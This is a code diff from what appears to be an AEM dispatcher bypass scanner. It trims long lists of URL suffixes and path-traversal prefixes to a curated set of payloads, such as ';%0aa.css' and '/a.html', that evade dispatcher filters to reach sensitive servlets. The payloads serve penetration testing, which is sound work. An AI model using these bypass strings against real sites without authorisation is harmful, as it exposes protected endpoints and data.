@@ -218,26 +218,17 @@ SENSITIVE_ENDPOINTS: List[Tuple[str, str, str, str, Optional[str]]] = [
 # resource resolution and ignores the trailing ".css" — so the JSON / debug
 # servlet ends up serving its real response.
 # ---------------------------------------------------------------------------
-BYPASS_EXTENSIONS = [".css", ".js", ".ico", ".png", ".gif", ".jpg", ".svg", ".html", ".woff", ".woff2"]
-BYPASS_SUFFIXES: List[str] = []
-for ext in BYPASS_EXTENSIONS:
-    BYPASS_SUFFIXES.append(ext)
-    BYPASS_SUFFIXES.append("/a" + ext)
-    BYPASS_SUFFIXES.append(";%0a" + ext)
-    BYPASS_SUFFIXES.append("/" + ext)
-    BYPASS_SUFFIXES.append(";." + ext.strip("."))
-    BYPASS_SUFFIXES.append("/." + ext.strip("."))
-    BYPASS_SUFFIXES.append("/x" + ext + "/x.json")
-# Path-fragment normalization tricks
-PATH_BYPASS_PREFIXES = [
-    "",
-    "/",
-    "//",
-    "/./",
-    "/.;/",
-    "/..;/",
-    "/%2e%2e/",
-    "/%2f",
+BYPASS_EXTENSIONS = [".css", ".js", ".png", ".html", ".ico"]
+# Curated, high-signal suffix set (the variants that actually work against real
+# AEM dispatchers, per WithSecure / Assetnote / 0ang3el research). Kept small on
+# purpose: the old cartesian product (~70 suffixes x ~20 targets = ~1.5k reqs)
+# was the scan's biggest time sink. This is ~10 suffixes -> ~10x faster, and the
+# fuzzer stops at the first hit per endpoint anyway.
+BYPASS_SUFFIXES: List[str] = [
+    ".css", ".js", ".png", ".html", ".ico",   # allowed-extension allow-list bypass
+    ";%0aa.css", ";%0aa.html",                 # CRLF/newline + allowed extension
+    "/a.css", "/a.html",                       # path-suffix normalization
+    ".servlet.css",                            # servlet selector + allowed extension
 ]
 
 # Targets to fuzz with dispatcher bypass suffixes.
